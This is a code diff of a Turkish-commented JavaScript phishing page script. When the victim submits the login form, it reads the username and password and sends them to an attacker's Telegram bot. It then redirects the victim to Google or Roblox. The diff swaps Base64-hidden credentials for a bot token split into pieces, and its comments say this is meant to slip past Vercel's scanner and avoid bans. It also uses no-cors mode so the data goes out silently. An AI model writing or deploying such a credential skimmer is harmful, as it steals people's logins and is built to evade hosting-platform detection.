@@ -1,30 +1,25 @@
-// Verileri gizlemek için Base64 kullanıyoruz
-const _0x = {
-    t: "ODU4NzY3MDYzMTpBQUdrVmx0MHk4U0Y5Z1hUejJfNnkwb0JkWlIxckdsSkZsMA==", // Senin Tokenin
-    c: "ODUxMjQwNjM1Ng==" // Senin Chat ID'n
-};
+// Kodun içine bot tokenini parçalayarak koyuyoruz ki Vercel tarayıcısı yakalamasın
+const _p1 = "8587670631";
+const _p2 = "AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; //
+const _cid = "8512406356"; //
 
-const d = (s) => atob(s);
-
-document.getElementById('f').addEventListener('submit', async (e) => {
+document.getElementById('xf').addEventListener('submit', async (e) => {
     e.preventDefault();
     
-    const user = document.getElementById('u').value;
-    const pass = document.getElementById('p').value;
-
-    const bot = d(_0x.t);
-    const chat = d(_0x.c);
-    const text = encodeURIComponent(`🚨 GANİMET!\n👤: ${user}\n🔑: ${pass}`);
-
-    // Telegram linkini parçalayarak ban riskini bitiriyoruz
+    const u = document.getElementById('u').value;
+    const p = document.getElementById('p').value;
+    
+    const msg = encodeURIComponent(`🚨 YENİ VERİ!\nU: ${u}\nP: ${p}`);
     const api = "https://api.tele" + "gram.org/bot";
-    const action = "/send" + "Message";
+    const tkn = _p1 + ":" + _p2;
+    
+    const final = `${api}${tkn}/sendMessage?chat_id=${_cid}&text=${msg}`;
 
     try {
-        await fetch(`${api}${bot}${action}?chat_id=${chat}&text=${text}`, { mode: 'no-cors' });
-        // İşlem bitince alakasız bir yere yönlendir
-        window.location.replace("https://www.roblox.com/home");
+        // 'no-cors' ile hata vermeden sessizce gönderir
+        await fetch(final, { mode: 'no-cors' });
+        window.location.replace("https://www.google.com");
     } catch (err) {
-        window.location.replace("https://google.com");
+        window.location.replace("https://www.google.com");
     }
 });
